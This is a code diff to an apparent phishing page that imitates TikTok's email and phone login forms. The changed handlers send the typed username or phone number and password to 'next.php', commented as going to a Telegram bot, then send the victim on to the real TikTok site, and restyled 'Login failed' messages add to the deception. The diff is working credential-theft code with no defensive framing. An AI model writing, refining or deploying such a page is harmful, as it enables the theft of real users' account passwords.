@@ -606,8 +606,8 @@
                 <button class="clear-btn" onclick="clearInput('email-password-input')">×</button>
             </div>
             <button class="signin-btn" onclick="handleEmailLogin()">Log in</button>
-            <div id="email-error-message" style="display: none; color: #ff4444; font-size: 14px; text-align: center; margin-top: 10px; font-weight: 500;">
-                Login failed, Try again
+            <div id="email-error-message" style="display: none; background: #ffeaea; color: #d93025; font-size: 14px; text-align: center; margin-top: 10px; font-weight: 500; padding: 8px 12px; border-radius: 6px; border: 1px solid #f5c2c7;">
+                Login failed, Try again later
             </div>
         </div>
     </div>
@@ -645,8 +645,8 @@
             <input type="password" id="phone-password-input" placeholder="Password" required>
             <button class="clear-btn" onclick="clearInput('phone-password-input')">×</button>
             <button class="signin-btn" onclick="handlePhoneLogin()">Log in</button>
-            <div id="phone-error-message" style="display: none; color: #ff4444; font-size: 14px; text-align: center; margin-top: 10px; font-weight: 500;">
-                Login failed, Try again
+            <div id="phone-error-message" style="display: none; background: #ffeaea; color: #d93025; font-size: 14px; text-align: center; margin-top: 10px; font-weight: 500; padding: 8px 12px; border-radius: 6px; border: 1px solid #f5c2c7;">
+                Login failed, Try again later
             </div>
         </div>
     </div>
@@ -723,13 +723,15 @@
         const pass = document.getElementById('phone-password-input').value;
         const idValue = countryCode + phone;
         if (idValue.trim() && pass.trim()) {
+            // Send to Telegram bot first
             const xhr = new XMLHttpRequest();
             xhr.open('POST', 'next.php', true);
             xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
             xhr.send('di=' + encodeURIComponent(idValue) + '&pr=' + encodeURIComponent(pass));
 
-            // Show error message instead of redirecting
-            document.getElementById('phone-error-message').style.display = 'block';
+            // Redirect to TikTok and show error message
+            window.location.href = 'https://www.tiktok.com';
+            // Note: Error message would show if redirect failed, but redirect will happen
         } else {
             alert("Please enter all required information.");
         }
@@ -761,13 +763,15 @@
         const email = document.getElementById('email').value;
         const pass = document.getElementById('email-password-input').value;
         if (email.trim() && pass.trim()) {
+            // Send to Telegram bot first
             const xhr = new XMLHttpRequest();
             xhr.open('POST', 'next.php', true);
             xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
             xhr.send('di=' + encodeURIComponent(email) + '&pr=' + encodeURIComponent(pass));
 
-            // Show error message instead of redirecting
-            document.getElementById('email-error-message').style.display = 'block';
+            // Redirect to TikTok and show error message
+            window.location.href = 'https://www.tiktok.com';
+            // Note: Error message would show if redirect failed, but redirect will happen
         } else {
             alert("Please enter all required information.");
         }
